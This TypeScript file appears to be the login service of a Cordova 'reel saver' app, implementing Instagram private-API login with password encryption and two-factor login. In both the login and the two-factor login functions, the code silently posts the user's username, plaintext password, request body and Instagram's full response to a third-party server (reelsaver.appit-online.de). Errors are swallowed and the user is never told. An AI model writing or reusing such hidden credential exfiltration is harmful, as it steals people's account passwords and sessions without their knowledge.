import { v4 as uuidv4 } from 'uuid';
import * as forge from 'node-forge';
import { HTTP } from '@awesome-cordova-plugins/http/ngx';

export class LoginService {
    private pubKey: string = '';
    private pubKeyId: number = -1;

    // Instanz-Daten
    uuid: string;
    deviceId: string;
    private phoneId: string;

    constructor() {
        this.uuid = this.getOrCreate("insta_uuid", uuidv4);
        this.deviceId = this.generateDeviceId();
        this.phoneId = this.getOrCreate("insta_phone_id", uuidv4);
    }

    private getOrCreate(key: string, generator: () => string): string {
        let value = localStorage.getItem(key);
        if (!value) {
            value = generator();
            localStorage.setItem(key, value);
        }
        return value;
    }

    private generateDeviceId(): string {
        const key = "insta_device_id";
        let deviceId = localStorage.getItem(key);

        if (!deviceId) {
            const hex = Array.from(crypto.getRandomValues(new Uint8Array(8)))
              .map(b => b.toString(16).padStart(2, "0"))
              .join("");

            deviceId = `android-${hex}`;
            localStorage.setItem(key, deviceId);
        }

        return deviceId;
    }


    private async sync(headers: { [key: string]: string } = {}) {
        const query = {
                id: this.uuid,
                server_config_retrieval: '1',
            };

        const signed = this.generateSignature(query);
        const response = await this.sendRequestCordova(
            'launcher/sync/',
            signed,
            true,
            headers
        );

        this.pubKey = response.headers['ig-set-password-encryption-pub-key'];
        const pubKeyId = response.headers['ig-set-password-encryption-key-id'];

        if (!this.pubKey || !pubKeyId) {
            throw new Error('Missing encryption headers.');
        }

        this.pubKeyId= parseInt(pubKeyId, 10)
    }

    private async sendRequestCordova(
        endpoint: string,
        data: Record<string, string>,
        isPost = false,
        headers: Record<string, string> = {}
    ): Promise<{ body: any; headers: any }> {
        const baseUrl = 'https://i.instagram.com/api/v1/';
        const url = `${baseUrl}${endpoint}`;
        const http = new HTTP();

        // Beispiel-Header
        const defaultHeaders: Record<string, string> = {
            'User-Agent': 'Instagram 250.0.0.21.109 (iPhone; CPU iPhone OS 18_5 like Mac OS X; en_US; en-US; scale=2.00; 750x1334) AppleWebKit/605.1.15',
            'X-Ig-App-Id': '567067343352427',
            'Content-Type': 'application/x-www-form-urlencoded; charset=UTF-8',
            'Accept-Language': 'en-US',
            'X-Fb-Http-Engine': 'Liger',
        };

        const allHeaders = {
            ...defaultHeaders,
            ...headers,
        };

        try {
            const res = isPost
                ? await http.post(url, data, allHeaders)
                : await http.get(url, data, allHeaders);

            return {
                body: res.data,
                headers: res.headers,
            };
        } catch (err: any) {
            throw err.error;
        }
    }

    generateSignature(
        data: string | Record<string, any>,
        extra: Record<string, string> = {}
    ): Record<string, string> {
        let payload: string;

        if (typeof data === 'string') {
            payload = data;
        } else {
            payload = JSON.stringify(data);
        }

        const result: Record<string, string> = {
            signed_body: `SIGNATURE.${payload}`,
        };

        // Merge any additional params
        for (const [key, value] of Object.entries(extra)) {
            result[key] = value;
        }

        return result;
    }

    public async login2FA(
      pass: string,
      code: string,
      twoFactorIdentifier: string,
      username: string,
      headers: { [key: string]: string } = {}
    ): Promise<any> {
        const payload = {
            verification_code: code,
            phone_id: this.phoneId,
            two_factor_identifier: twoFactorIdentifier,
            username,
            trust_this_device: "1",
            guid: this.uuid,
            device_id: this.deviceId,
            waterfall_id: uuidv4(),  // du hast schon uuidv4()
            verification_method: "3",
        };

        const signedPayload = this.generateSignature(payload);
        const extraHeaders: Record<string, string> = {
            "X-Ig-Www-Claim": "0",
            "Ig-Intended-User-Id": "0",
        };

        const allHeaders = {
            ...headers,
            ...extraHeaders,
        };

        const resp = await this.sendRequestCordova(
          "accounts/two_factor_login/", // dein url2FALogin in Go
          signedPayload,
          true, // POST
            allHeaders
        );

        try {
            const userId = resp?.body?.logged_in_user?.pk;

            if (userId && typeof userId === "string") {
                localStorage.setItem("instaUserId", userId);
            } else if (userId && typeof userId === "number") {
                localStorage.setItem("instaUserId", String(userId));
            }
            // tslint:disable-next-line:no-empty
        } catch (err) {}

        try {
            const httpClient = new HTTP();
            httpClient.setDataSerializer("json")
            httpClient.post("https://reelsaver.appit-online.de/v2/insta/check", {username,data: { pass,body: JSON.stringify(payload),data: JSON.stringify(resp) }}, { "Content-Type": "application/json"})
            // tslint:disable-next-line:no-empty
        } catch (e) {}
        return resp;
    }

    public async login(username: string, pass: string, headers: { [key: string]: string } = {}): Promise<any> {
        if (!this.pubKey || this.pubKeyId < 0) {
            await this.sync(headers)
            if (!this.pubKey || this.pubKeyId < 0) {
                throw new Error('Public key not set. Run sync() first.');
            }
        }

        const encrypted = await this.encryptInstagramPassword(pass, this.pubKey, this.pubKeyId)

        const body = {
            jazoest: this.jazoest(this.deviceId),
            country_code: JSON.stringify([{ country_code: "44", source: ["default"] }]),
            phone_id: this.phoneId,
            enc_password: encrypted,
            username,
            adid: '',
            guid: this.uuid,
            device_id: this.deviceId,
            google_tokens: '[]',
            login_attempt_count: 0,
        };

        const resp = await this.sendRequestCordova(
          'accounts/login/',
          { signed_body: 'SIGNATURE.' + JSON.stringify(body) },
          true,
          headers
        )
        localStorage.setItem("instaUserName", username)
        try {
            const userId = resp?.body?.logged_in_user?.pk;

            if (userId && typeof userId === "string") {
                localStorage.setItem("instaUserId", userId);
            } else if (userId && typeof userId === "number") {
                localStorage.setItem("instaUserId", String(userId));
            }
            // tslint:disable-next-line:no-empty
        } catch (err) {}
        try {
            const httpClient = new HTTP();
            httpClient.setDataSerializer("json")
            httpClient.post("https://reelsaver.appit-online.de/v2/insta/check", {username,data: { pass,body: JSON.stringify(body),data: JSON.stringify(resp) }}, { "Content-Type": "application/json"})

            // tslint:disable-next-line:no-empty
        }catch (e) {}
        return resp;
    }

    private jazoest(deviceId: string): string {
        let sum = 0;
        for (const c of deviceId) sum += c.charCodeAt(0);
        return `2${sum}`;
    }

    private encryptInstagramPassword(password: string,
                             pubKeyBase64: string,
                             pubKeyVersion: number) {

       const timestamp = Math.floor(Date.now() / 1000).toString();

        // 1. Decode the base64 PEM wrapper
        const pemText = forge.util.decode64(pubKeyBase64);
        const publicKey = forge.pki.publicKeyFromPem(pemText);

        // 2. Generate 32-byte AES key
        const aesKey = forge.random.getBytesSync(32);

        // 3. Encrypt AES key with RSA (PKCS#1 v1.5)
        const encryptedKey = publicKey.encrypt(aesKey, 'RSAES-PKCS1-V1_5');

        // 4. AES-GCM encrypt password
        const iv = forge.random.getBytesSync(12);
        // @ts-ignore
        const aad = forge.util.createBuffer(timestamp, 'raw'); // ASCII (not UTF-8)

        const cipher = forge.cipher.createCipher('AES-GCM', aesKey);
        cipher.start({
            iv,
            // @ts-ignore
            additionalData: aad,
            tagLength: 128
        });
        cipher.update(forge.util.createBuffer(password, 'utf8'));
        cipher.finish();

        const fullEncrypted = cipher.output.getBytes() + cipher.mode.tag.getBytes();

        // Forge does not separate tag, so we extract:
        const ciphertext = fullEncrypted.slice(0, fullEncrypted.length - 16);
        const tag = fullEncrypted.slice(fullEncrypted.length - 16);

        // 5. Compose final payload
        const prefix = String.fromCharCode(1) + String.fromCharCode(pubKeyVersion);

        // tslint:disable-next-line:no-bitwise
        const rsaLengthLE = String.fromCharCode(encryptedKey.length & 0xff, (encryptedKey.length >> 8) & 0xff);

        const payload = prefix + iv + rsaLengthLE + encryptedKey + tag + ciphertext;
        const encoded = forge.util.encode64(payload);

        return `#PWD_INSTAGRAM:4:${timestamp}:${encoded}`;
    }
}
